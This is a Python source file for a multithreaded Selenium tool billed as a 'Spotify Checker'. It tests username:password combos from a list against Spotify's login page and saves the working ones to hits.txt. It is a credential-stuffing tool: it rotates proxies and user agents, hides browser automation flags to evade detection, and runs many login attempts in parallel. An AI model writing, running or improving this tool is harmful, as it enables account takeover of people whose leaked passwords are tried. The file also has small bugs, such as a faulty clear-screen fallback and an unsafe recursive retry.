from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from colorama import init,Style,Fore
from os import name,system
from random import choice
from threading import Thread,Lock
from sys import stdout

class Main:
    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title_name:str):
        system("title {0}".format(title_name))

    def TitleUpdate(self):
        while True:
            self.SetTitle('One Man Builds Spotify Checker Selenium Tool ^| HITS: {0} ^| BADS: {1} ^| RETRIES: {2}'.format(self.hits,self.bads,self.retries))
            sleep(0.1)

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def GetRandomUserAgent(self):
        useragents = self.ReadFile('useragents.txt','r')
        return choice(useragents)

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('proxies.txt','r')
        return choice(proxies_file)

    def __init__(self):
        self.clear()
        self.SetTitle('One Man Builds Spotify Checker Selenium Tool')
        init(convert=True)
        self.lock = Lock()
        self.hits = 0
        self.bads = 0
        self.retries = 0

        title = Style.BRIGHT+Fore.RED+"""
                                 ╔══════════════════════════════════════════════════╗
                                      ╔═╗╔═╗╔═╗╔╦╗╦╔═╗╦ ╦  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                      ╚═╗╠═╝║ ║ ║ ║╠╣ ╚╦╝  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                      ╚═╝╩  ╚═╝ ╩ ╩╚   ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                 ╚══════════════════════════════════════════════════╝


        """
        print(title)
        self.use_proxy = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Proxy ['+Fore.RED+'0'+Fore.CYAN+']Proxyless: '))
        self.headless = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] ['+Fore.RED+'1'+Fore.CYAN+']Headless ['+Fore.RED+'0'+Fore.CYAN+']Not Headless: '))
        self.website_load_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Website Load Max Wait (seconds): '))
        self.login_check_max_wait = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Login Check Max Wait (seconds): '))
        self.wait_before_start = float(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Wait Before Start (seconds): '))
        self.browser_amount = int(input(Style.BRIGHT+Fore.CYAN+'['+Fore.RED+'>'+Fore.CYAN+'] Threads: '))
        print('')

    def ReadFile(self,filename,method):
        with open(filename,method) as f:
            content = [line.strip('\n') for line in f]
            return content

    def Login(self,username,password):
        try:
            options = Options()

            options.add_argument(f'--user-agent={self.GetRandomUserAgent()}')
            options.add_argument('--no-sandbox')
            options.add_argument('--log-level=3')
            options.add_argument('--lang=en')

            if self.use_proxy == 1:
                options.add_argument('--proxy-server=http://{0}'.format(self.GetRandomProxy()))

            if self.headless == 1:
                options.add_argument('--headless')

            #Removes navigator.webdriver flag
            options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
            
            # For older ChromeDriver under version 79.0.3945.16
            options.add_experimental_option('useAutomationExtension', False)

            options.add_argument("window-size=1280,800")

            #For ChromeDriver version 79.0.3945.16 or over
            options.add_argument('--disable-blink-features=AutomationControlled')
            driver = webdriver.Chrome(options=options)

            driver.get('https://accounts.spotify.com/en/login/')
            login_username_present = EC.presence_of_element_located((By.ID, 'login-username'))
            WebDriverWait(driver, self.website_load_max_wait).until(login_username_present)

            username_elem = driver.find_element_by_id('login-username').send_keys(username)
            password_elem = driver.find_element_by_id('login-password').send_keys(password)
            login_button_elem = driver.find_element_by_id('login-button').click()

            try:
                url_to_be_present = EC.url_to_be('https://accounts.spotify.com/en/status')
                WebDriverWait(driver, self.login_check_max_wait).until(url_to_be_present)
                self.PrintText(Fore.CYAN,Fore.RED,'HIT',f'{username}:{password}')
                with open('hits.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
                self.hits += 1
            except TimeoutException:
                self.PrintText(Fore.RED,Fore.CYAN,'BAD',f'{username}:{password}')
                with open('bads.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
                self.bads += 1
                
        except:
            self.retries += 1
            driver.quit()
            self.Login(username,password)
        finally:
            driver.quit()
        

    def Start(self):
        Thread(target=self.TitleUpdate).start()
        combos = self.ReadFile('combos.txt','r')
        with ThreadPoolExecutor(max_workers=self.browser_amount) as ex:
            for combo in combos:
                username = combo.split(':')[0]
                password = combo.split(':')[-1]
                ex.submit(self.Login,username,password)
                if self.wait_before_start > 0:
                    sleep(self.wait_before_start)

if __name__ == '__main__':
    main = Main()
    main.Start()